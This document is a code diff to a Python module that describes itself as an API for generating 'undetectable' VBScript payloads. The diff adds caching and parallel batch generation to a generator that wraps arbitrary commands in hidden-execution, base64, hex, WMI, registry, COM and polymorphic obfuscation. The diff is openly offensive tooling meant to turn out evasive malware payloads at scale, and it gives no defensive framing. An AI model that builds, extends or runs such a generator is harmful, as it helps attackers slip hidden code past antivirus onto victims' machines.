@@ -6,16 +6,24 @@ Provides clean, easy-to-use API for generating undetectable VBS payloads
 
 from vbs_encoder import VBSEncoder, generate_clean_vbs_payload, ObfuscationConfig
 from vbs_advanced_obfuscation import create_stealthy_payload
-from typing import Optional, List
+from typing import Optional, List, Dict, Tuple
 import argparse
 import sys
+from concurrent.futures import ThreadPoolExecutor
+import threading
 
 
 class PayloadGenerator:
-    """Main interface for generating payloads"""
+    """Main interface for generating payloads with caching and batch support"""
 
-    def __init__(self):
+    # Class-level payload cache (shared across instances)
+    _payload_cache: Dict[Tuple[str, str, str], str] = {}
+    _cache_lock = threading.Lock()
+    _max_cache_size = 1000  # Limit cache size to prevent memory bloat
+
+    def __init__(self, enable_caching: bool = True, enable_randomization: bool = True):
         self.encoder = VBSEncoder()
+        self.enable_caching = enable_caching
         self.techniques = [
             "basic",
             "base64",
@@ -30,12 +38,14 @@ class PayloadGenerator:
             "multi_encoding",
             "hidden_execution",
         ]
+        # Control variable name randomization for performance
+        VBSEncoder._randomize_names = enable_randomization
 
     def generate(
         self, command: str, technique: str = "base64", obfuscation_level: str = "high"
     ) -> str:
         """
-        Generate VBS payload using specified technique
+        Generate VBS payload using specified technique with caching support
 
         Args:
             command: Command to execute
@@ -46,29 +56,45 @@ class PayloadGenerator:
             VBS payload code
         """
 
+        # Check cache before generating
+        if self.enable_caching:
+            cache_key = (command, technique, obfuscation_level)
+            if cache_key in PayloadGenerator._payload_cache:
+                return PayloadGenerator._payload_cache[cache_key]
+        else:
+            cache_key = None
+
+        # Generate payload
         if technique == "basic":
-            return self.encoder.create_wscript_hidden_execution(command)
+            payload = self.encoder.create_wscript_hidden_execution(command)
 
         elif technique == "base64":
-            return self.encoder.create_full_obfuscated_payload(command, "base64")
+            payload = self.encoder.create_full_obfuscated_payload(command, "base64")
 
         elif technique == "hex":
-            return self.encoder.create_full_obfuscated_payload(command, "hex")
+            payload = self.encoder.create_full_obfuscated_payload(command, "hex")
 
         elif technique == "array":
-            return self.encoder.create_full_obfuscated_payload(command, "array")
+            payload = self.encoder.create_full_obfuscated_payload(command, "array")
 
         elif technique in ["wmi", "registry", "env", "com", "obfuscated_calls", "filewriter", "multi_encoding"]:
-            return create_stealthy_payload(command, technique)
+            payload = create_stealthy_payload(command, technique)
 
         elif technique == "hidden_execution":
             payload = generate_clean_vbs_payload(command, obfuscation_level)
             if obfuscation_level == "high":
-                return self.encoder.create_polymorphic_wrapper(payload)
-            return payload
+                payload = self.encoder.create_polymorphic_wrapper(payload)
 
         else:
             raise ValueError(f"Unknown technique: {technique}")
+
+        # Store in cache (thread-safe)
+        if self.enable_caching and cache_key:
+            with PayloadGenerator._cache_lock:
+                if len(PayloadGenerator._payload_cache) < PayloadGenerator._max_cache_size:
+                    PayloadGenerator._payload_cache[cache_key] = payload
+
+        return payload
 
     def list_techniques(self) -> List[str]:
         """List all available techniques"""
@@ -91,6 +117,57 @@ class PayloadGenerator:
             "hidden_execution": "Wrapped payload with polymorphic obfuscation",
         }
         return descriptions.get(technique, "Unknown technique")
+
+    def generate_batch(
+        self,
+        commands: List[str],
+        technique: str = "base64",
+        obfuscation_level: str = "high",
+        num_workers: int = 4,
+        use_threading: bool = True
+    ) -> List[str]:
+        """
+        Generate multiple payloads efficiently using optional parallelization
+
+        Args:
+            commands: List of commands to encode
+            technique: Obfuscation technique to use
+            obfuscation_level: "low", "medium", "high"
+            num_workers: Number of worker threads (ignored if use_threading=False)
+            use_threading: Use ThreadPoolExecutor for parallel generation
+
+        Returns:
+            List of VBS payloads
+        """
+        if not use_threading or len(commands) < 3:
+            # Sequential generation for small batches
+            return [self.generate(cmd, technique, obfuscation_level) for cmd in commands]
+
+        # Parallel generation
+        results = []
+        with ThreadPoolExecutor(max_workers=min(num_workers, len(commands))) as executor:
+            futures = [
+                executor.submit(self.generate, cmd, technique, obfuscation_level)
+                for cmd in commands
+            ]
+            results = [f.result() for f in futures]
+
+        return results
+
+    def clear_cache(self):
+        """Clear the payload cache"""
+        with PayloadGenerator._cache_lock:
+            PayloadGenerator._payload_cache.clear()
+
+    @classmethod
+    def get_cache_stats(cls) -> Dict[str, int]:
+        """Get cache statistics"""
+        with cls._cache_lock:
+            return {
+                'cache_size': len(cls._payload_cache),
+                'max_size': cls._max_cache_size,
+                'usage_percent': (len(cls._payload_cache) / cls._max_cache_size) * 100
+            }
 
 
 def main():
